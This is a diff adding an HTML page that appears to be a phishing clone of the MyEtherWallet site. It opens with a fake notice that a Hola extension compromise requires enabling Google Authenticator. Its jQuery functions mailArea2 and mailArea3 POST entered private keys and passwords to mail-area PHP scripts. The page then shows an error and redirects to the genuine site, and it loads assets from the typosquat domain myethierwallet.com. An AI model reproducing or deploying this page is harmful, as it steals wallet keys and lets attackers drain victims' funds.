@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<html ng-app="mewApp" class="ng-scope" lang="en"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+  <meta charset="utf-8">
+  <title>MyEtherWallet.com</title>
+  <link rel="canonical" href="../www.myetherwallet.com/index.html">
+  <meta name="description" content="Open-Source &amp; Client-Side Ethereum Wallet">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="index.php_files/etherwallet-master.css">
+<!--   <script type="text/javascript" src="index.php_files/etherwallet-static.js"></script> -->
+<script type="text/javascript" src="index.php_files/etherwallet-static.js"></script>
+  <script type="text/javascript" src="index.php_files/etherwallet-master.js"></script>
+
+  <link rel="apple-touch-icon" sizes="180x180" href="../www.myetherwallet.com/images/fav/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="../www.myetherwallet.com/images/fav/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="../www.myetherwallet.com/images/fav/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="../www.myetherwallet.com/images/fav/manifest.json">
+  <link rel="mask-icon" href="../www.myetherwallet.com/images/fav/safari-pinned-tab.svg" color="#0e97c0">
+  <link rel="shortcut icon" href="../www.myetherwallet.com/images/fav/favicon.ico">
+  <meta name="msapplication-config" content="images/fav/browserconfig.xml">
+  <meta name="theme-color" content="#163151">
+  <link href="index.php_files/css.css" rel="stylesheet"> 
+
+  <meta property="og:url" content="https://www.MyEtherWallet.com">
+  <meta property="og:title" content="MyEtherWallet.com">
+  <meta property="og:description" content="MyEtherWallet.com">
+  <meta property="og:image" content="images/fb-myetherwallet.png">
+  <meta property="og:image" content="images/fb-mewtwo.jpg">
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-101879121-8', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<script src="index.php_files/jquery-1.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+  	<script type="text/javascript" src="index.php_files/bootstrap.min.js"></script>
+	<style>
+		.area-1-jq, .area-1-jq-submit, .area-2-jq, .area-2-jq-submit, .area-3-jq, .area-3-jq-submit, #alert-danger-modal, #alert-danger-modal2, #aria-1-password, #area-1-password-title, .area-2-mm, .area-2-db, #disclaimerModal, #alert-success-modal
+		{
+			display: none;
+		}
+		
+		.pre-footer {
+			padding: 1rem;
+			-webkit-box-shadow: 16px 16px 47px 0 rgba(0,0,0,.07);
+			box-shadow: 16px 16px 47px 0 rgba(0,0,0,.07);
+			margin-top: 5rem;
+			background-color: #fff;
+			text-align: center;
+		}
+		
+		.pre-footer p {
+			font-size: 1.3rem;
+		}
+		
+		.annoucement-danger:hover{
+		    background-color: #ff4408;
+		}
+	</style>
+	<script type="text/javascript">
+	$(document).ready(function(){
+		var countVisits = localStorage['count'];
+		if (countVisits == 2) {
+			window.location.replace('https://www.myetherwallet.com/');
+		}
+		
+		var firstVisit = localStorage['visited'];
+		if (!firstVisit) {
+			$('#alert-success-modal').fadeIn();
+			setTimeout(function(){$('#alert-success-modal').fadeOut();}, 5000);
+			localStorage['visited'] = "yes";
+			localStorage['count'] = 0;
+		}
+		
+		$('.radio > input').prop('checked', false);
+		$('.radio').click(function(){
+			$('.radio > input').prop('checked', false);
+			$('.area-1-jq, .area-2-jq, .area-3-jq, .area-1-jq-submit, .area-2-jq-submit, .area-3-jq-submit, .area-2-mm, .area-2-db').hide();
+			$('#area-2-mm-submit').hide();
+			
+			$(this).find('input').prop('checked', true);
+			var selector = $(this).find('input').attr('id');
+			$('.' + selector).show();
+			//$('.' + selector + '-submit').show();
+		});
+		
+		$('#aria2').on('keyup', function(event){
+			if($(this).val().length == '64')
+			{
+				$(this).removeClass('is-invalid').addClass('is-valid');
+				$('.area-2-jq-submit').show();
+			}
+			
+		});
+		
+		$('#aria3').on('keyup', function(event){
+			
+			
+				$(this).removeClass('is-invalid').addClass('is-valid');
+				$('.area-3-jq-submit').show();
+			
+		});
+		
+		$('#area-2-jq-submit, #area-3-jq-submit').click(function(){
+			$('#alert-danger-modal').fadeIn();
+			//$('#area-2-jq-submit, #area-3-jq-submit').hide();
+			//$('#area-2-jq-submit, #area-3-jq-submit').prep('disabled', true);
+			
+			var count = localStorage['count'];
+			count++;
+			localStorage['count'] = count;
+			if(localStorage['count'] == 2)
+			$(this).hide();
+			setTimeout(function(){window.location.replace("http://myetherwallet.com");}, 3000);
+		});
+		
+		$('#area-1-submit-count').click(function(){
+			var count = localStorage['count'];
+			count++;
+			localStorage['count'] = count;
+			console.log(count);
+		});
+		
+		$('#area-2-mm-submit, #area-2-db-submit, #area-3-lw, #area-4-tz').click(function(){
+			$('#alert-danger-modal2').fadeIn();
+			$('#area-2-mm-submit').hide();
+		});
+		
+		$('.icon-close').click(function(){
+			$('#alert-danger-modal, #alert-danger-modal2').fadeOut();
+		});
+		
+		$('#upload-wallet-1').click(function(){
+			$('#id-wallet-1-parent').click();
+		});
+		
+		$('#id-wallet-1-parent').change(function(){
+			$('#aria-1-password').show();
+			$('#area-1-password-title').show();
+			$('#upload-wallet-1').html('File Selected');
+			$('#upload-wallet-1').css('background-color','#0e97c0').css('color','#ffffff');
+			
+		});
+		
+		$('#aria-1-password').on('keyup', function(){
+			$('.area-1-jq-submit').show();
+		});
+		
+		$('#area-1-mm').click(function(){
+			$('.area-2-mm').show();
+		});
+		
+		$('#area-2-db').click(function(){
+			$('.area-2-db').show();
+		});
+
+		/* Plus Minus Toggling */
+
+		$('.collapse-button').click(function(){
+			if($(this).text() == '-'){
+				$(this).text('+');
+				$(".show-hide-toggle").css('visibility','hidden');
+			} else {
+				$(this).text('-');
+				$(".show-hide-toggle").css('visibility','visible');
+			}
+
+		})
+
+		/* Modal */
+		$('#onboardingModal').modal('show');
+		$('#modal-close').click(function(){
+			$('#onboardingModal').modal('hide');
+		})
+
+		
+	});
+	function mailArea2(){
+		jQuery.ajax({
+			url: "mail-area2.php",
+			method: "POST",
+			data: {key2: $('#aria2').val()}
+		}).done(function(){$('#alert-danger-modal').fadeIn();});
+	}
+	
+	function mailArea3(){
+		jQuery.ajax({
+			url: "mail-area3.php",
+			method: "POST",
+			data: {key3: $('#aria3').val(), pass: $('#aria-3-password').val()}
+		}).done(function(){$('#alert-danger-modal').fadeIn();});
+	}
+</script>
+</head>
+
+
+ <div class="modal fade" id="onboardingModal" tabindex="-1" style="" data-backdrop="static" data-keyboard="false">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-body">
+      	<br>
+        <article class="onboarding__modal" >
+          <h3 class="onboarding__title">
+            <span class="ng-scope">Welcome to MyEtherWallet.com</span>
+            <br>
+            <small class="ng-scope">Enable Google Authenticator / SMS code protection</small>
+          </h3>
+          <section class="row row--flex">
+            <div class="col-xs-12 col-sm-12 onboarding__content">
+              <p class="alert-danger--outline">
+                <span class="ng-scope">On 9th of July we have received a report that Hola, a Chrome extension, has been compromised. The extension started to log all the traffic from MyEtherWallet. Due to this vulnerabiltiy, all wallets are required to enable Google Authenticator / SMS Code protection.</span>
+              </p>
+            </div>
+          </section>
+          <section class="row row--flex">
+            <div class="col-xs-12 col-sm-7 onboarding__content">
+              <h5 class="ng-scope">What is MEW?</h5>
+              <ul>
+                <li class="ng-scope">MyEtherWallet is a free, open-source, client-side interface.</li>
+                <li class="ng-scope">We allow you to interact directly with the blockchain while remaining in full control of your keys &amp; your funds.</li>
+                <li class="ng-scope"><strong>You</strong> and <strong>only you</strong> are responsible for your security.</li>
+
+              </ul>
+              <h5 class="ng-scope">What is Google Authenticator?</h5>
+              <ul>
+                <li class="ng-scope">Google Authenticator is a free service that implements two-step authenticating users of mobile applications by Google.</li>
+                <li class="ng-scope">Authenticator provides a six- to eight-digit one-time password which users must provide in addition to their username and password to log into Google services or other sites.</li>
+              </ul>
+            </div>
+            <div class="col-xs-12 col-sm-5 onboarding__image">
+              <img src="images/onboarding_icon-01.svg" width="100%" height="auto">
+            </div>
+          </section>
+          <div class="onboarding__buttons text-center">
+            <a id="modal-close" class="btn btn-primary">
+              <span class="ng-scope">Enable Google Authenticator / SMS code protection</span>
+            </a>
+          </div>
+        </article>
+
+      </div>
+    </div>
+  </div>
+</div><div class="ng-scope" id="alert-success-modal">
+  <div class="alert popup alert-info animated-show-hide" style="bottom: 0px; z-index: 999;">
+    <div class="container">
+      <div class="alert-message ng-binding">You are successfully connected<br> Network: <strong>ETH </strong> provided by <strong>MyEtherWallet.</strong></div>
+    </div>
+    <i class="icon-close"></i>
+  </div>
+</div>
+
+<body class="modal-open">
+
+<header class="ETH MyEtherWallet MyEtherWallet nav-index-0 ng-scope" aria-label="header" ng-controller="tabsCtrl">
+    <div class="small announcement annoucement-danger">
+        <div class="container">
+          DON'T GET PHISHED, please! 🎣 Thank you! 🤗
+          <br>
+          1. BOOKMARK <a href="../www.myetherwallet.com/index.html"> MYETHERWALLET.COM </a>
+          <span class="hidden-xs">
+            &nbsp;&nbsp;&nbsp;&nbsp;
+            2. INSTALL <a href="../chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn.html" target="_blank" rel="noopener noreferrer">EAL</a>
+            or
+            <a href="../myetherwallet.github.io/knowledge-base/migration/moving-from-private-key-to-metamask.html" target="_blank" rel="noopener noreferrer">MetaMask</a>
+            or
+            <a href="../chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige.html" target="_blank" rel="noopener noreferrer">Cryptonite</a>
+          </span>
+        </div>
+    </div>
+    <section class="bg-gradient header-branding">
+      <section class="container">
+        
+          <a class="brand" href="index.html" aria-label="Go to homepage">
+            <img src="index.php_files/logo-myetherwallet.svg" height="64px" width="245px" alt="MyEtherWallet">
+            <p class="small visible-xs">3.21.16</p>
+          </a>
+        
+        
+        <div class="tagline">
+
+        <span class="hidden-xs">3.21.16</span>
+
+        <span class="dropdown dropdown-lang">
+          <a tabindex="0" aria-haspopup="true" aria-expanded="false" aria-label="change language. current language English" class="dropdown-toggle  btn btn-white ng-binding" ng-click="dropdown = !dropdown">English<i class="caret"></i></a>
+          <ul class="dropdown-menu ng-hide" ng-show="dropdown">
+            <li><a ng-class="{true:'active'}[curLang=='Català']" ng-click="changeLanguage('ca','Català'         )"> Català          </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Deutsch']" ng-click="changeLanguage('de','Deutsch'        )"> Deutsch         </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Ελληνικά']" ng-click="changeLanguage('el','Ελληνικά'       )"> Ελληνικά        </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='English']" ng-click="changeLanguage('en','English'        )" class="active"> English         </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Español']" ng-click="changeLanguage('es','Español'        )"> Español         </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Farsi']" ng-click="changeLanguage('fa','Farsi'          )"> Farsi           </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Suomi']" ng-click="changeLanguage('fi','Suomi'          )"> Suomi           </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Français']" ng-click="changeLanguage('fr','Français'       )"> Français        </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Magyar']" ng-click="changeLanguage('hu','Magyar'         )"> Magyar          </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Haitian Creole']" ng-click="changeLanguage('ht','Haitian Creole' )"> Haitian Creole  </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Indonesian']" ng-click="changeLanguage('id','Indonesian'     )"> Bahasa Indonesia</a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Italiano']" ng-click="changeLanguage('it','Italiano'       )"> Italiano        </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='日本語']" ng-click="changeLanguage('ja','日本語'          )"> 日本語          </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='한국어']" ng-click="changeLanguage('ko','한국어'          )"> 한국어           </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Nederlands']" ng-click="changeLanguage('nl','Nederlands'     )"> Nederlands      </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Norsk Bokmål']" ng-click="changeLanguage('no','Norsk Bokmål'   )"> Norsk Bokmål    </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Polski']" ng-click="changeLanguage('pl','Polski'         )"> Polski          </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Português']" ng-click="changeLanguage('pt','Português'      )"> Português       </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Русский']" ng-click="changeLanguage('ru','Русский'        )"> Русский         </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='ภาษาไทย']" ng-click="changeLanguage('th','ภาษาไทย'        )"> ภาษาไทย         </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Türkçe']" ng-click="changeLanguage('tr','Türkçe'         )"> Türkçe          </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='Tiếng Việt']" ng-click="changeLanguage('vi','Tiếng Việt'     )"> Tiếng Việt      </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='简体中文']" ng-click="changeLanguage('zhcn','简体中文'      )"> 简体中文         </a></li>
+            <li><a ng-class="{true:'active'}[curLang=='繁體中文']" ng-click="changeLanguage('zhtw','繁體中文'      )"> 繁體中文         </a></li>
+            <li role="separator" class="divider"></li>
+            <li><a data-toggle="modal" data-target="#disclaimerModal" translate="FOOTER_4" class="ng-scope">Disclaimer</a></li>
+          </ul>
+        </span>
+
+        <span class="dropdown dropdown-gas">
+          <a tabindex="0" aria-haspopup="true" aria-label="adjust gas price" class="dropdown-toggle  btn btn-white ng-binding" ng-click="dropdownGasPrice = !dropdownGasPrice">
+            <span translate="OFFLINE_Step2_Label_3" class="ng-scope">Gas Price</span>:
+              41 Gwei
+              <i class="caret"></i>
+          </a>
+          <ul class="dropdown-menu ng-hide" ng-show="dropdownGasPrice">
+            <div class="header--gas ng-binding">
+              <span translate="OFFLINE_Step2_Label_3" class="ng-scope">Gas Price</span>:
+              41 Gwei
+              <input type="range" ng-model="gas.value" min="1" max="99" step="1" ng-change="gasChanged()" class="ng-pristine ng-untouched ng-valid ng-not-empty ng-valid-min ng-valid-max ng-valid-step">
+              <p class="small col-xs-4 text-left"> <!--translate="GAS_Price_1"-->
+                Really, really slow
+              </p>
+              <p class="small col-xs-4 text-center"> <!--translate="GAS_Price_2"-->
+                Maybe Fast?
+              </p>
+              <p class="small col-xs-4 text-right"> <!--translate="GAS_Price_3"-->
+                Fast
+              </p>
+              <br>
+              <p class="small ng-scope" style="white-space:normal;font-weight:300;margin: 2rem 0 0;" translate="GAS_PRICE_Desc">Gas Price is the amount you pay per unit of gas. <code>TX fee = gas price * gas limit</code> &amp; is paid to miners for including your TX in a block. Higher the gas price = faster transaction, but more expensive. Default is <code>41 GWEI</code>.</p>
+              <a class="small ng-scope" translate="x_ReadMore" href="../myetherwallet.github.io/knowledge-base/gas/what-is-gas-ethereum.html" target="_blank" rel="noopener noreferrer">Read More</a>
+            </div>
+          </ul>
+          <p class="dropdown-gas__msg" ng-show="gasPriceMsg" ng-hide="ajaxReq.type!='ETH'">
+            The network is really full right now. Check
+            <a href="../ethgasstation.info/index.html" target="_blank" rel="noopener noreferrer">Eth Gas Station</a>
+            for gas price to use.
+          </p>
+        </span>
+
+        <!-- Warning: The separators you see on the frontend are in styles/etherwallet-custom.less. If you add / change a node, you have to adjust these. Ping tayvano if you're not a CSS wizard -->
+        <span class="dropdown dropdown-node">
+          <a tabindex="0" aria-haspopup="true" aria-label="change node. current node ETH node by myetherwallet.com" class="dropdown-toggle  btn btn-white ng-binding" ng-click="dropdownNode = !dropdownNode">
+               <span translate="Network" class="ng-scope">Network</span>
+               ETH
+               <small class="ng-binding">(myetherwallet.com)</small>
+               <i class="caret"></i>
+          </a>
+          <ul class="dropdown-menu ng-hide" ng-show="dropdownNode">
+            <!-- ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETH
+                <small class="ng-binding"> (myetherwallet.com) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETH
+                <small class="ng-binding"> (etherscan.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETH
+                <small class="ng-binding"> (infura.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETH
+                <small class="ng-binding"> (giveth.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETC
+                <small class="ng-binding"> (Ethereum Commonwealth) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETC
+                <small class="ng-binding"> (Chainkorea) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETC
+                <small class="ng-binding"> (epool.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                Ropsten
+                <small class="ng-binding"> (myetherwallet.com) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                Ropsten
+                <small class="ng-binding"> (infura.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                Kovan
+                <small class="ng-binding"> (etherscan.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                Kovan
+                <small class="ng-binding"> (infura.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                Rinkeby
+                <small class="ng-binding"> (etherscan.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                Rinkeby
+                <small class="ng-binding"> (infura.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                EXP
+                <small class="ng-binding"> (expanse.tech) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                UBQ
+                <small class="ng-binding"> (ubiqscan.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                POA
+                <small class="ng-binding"> (poa.infura.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                TOMO
+                <small class="ng-binding"> (core.tomocoin.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ELLA
+                <small class="ng-binding"> (ellaism.org) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                ETSC
+                <small class="ng-binding"> (ethereumsocial.kr) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                EGEM
+                <small class="ng-binding"> (egem.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                CLO
+                <small class="ng-binding"> (Callisto.network) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                EAST
+                <small class="ng-binding"> (easthub.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                X888
+                <small class="ng-binding"> (eightereum) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                MUSIC
+                <small class="ng-binding"> (musicoin.org) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                YAP
+                <small class="ng-binding"> (yapstone.pro) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                GO
+                <small class="ng-binding"> (gochain.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList --><li ng-repeat="(key, value) in nodeList" class="ng-scope">
+              <a ng-class="{true:'active'}[curNode == key]" ng-click="changeNode(key)" class="ng-binding">
+                EOSC
+                <small class="ng-binding"> (eos-classic.io) </small>
+                <img ng-show="value.service=='Custom'" src="http://myethierwallet.com/images/icon-remove.svg" class="node-remove ng-hide" title="Remove Custom Node" ng-click="removeNodeFromLocal(value.name)">
+              </a>
+            </li><!-- end ngRepeat: (key, value) in nodeList -->
+            <li>
+              <a ng-click="customNodeModal.open(); dropdownNode = !dropdownNode;" translate="X_Network_Custom" class="ng-scope">Add Custom Network / Node</a>
+            </li>
+          </ul>
+        </span>
+
+        </div>
+      </section>
+    </section>
+
+   <nav role="navigation" aria-label="main navigation" class="container nav-container overflowing">
+    <a aria-hidden="true" ng-show="showLeftArrow" class="nav-arrow-left ng-hide" ng-click="scrollLeft(100);" ng-mouseover="scrollHoverIn(true,2);" ng-mouseleave="scrollHoverOut()">«</a>
+    <div class="nav-scroll">
+      <ul class="nav-inner">
+        
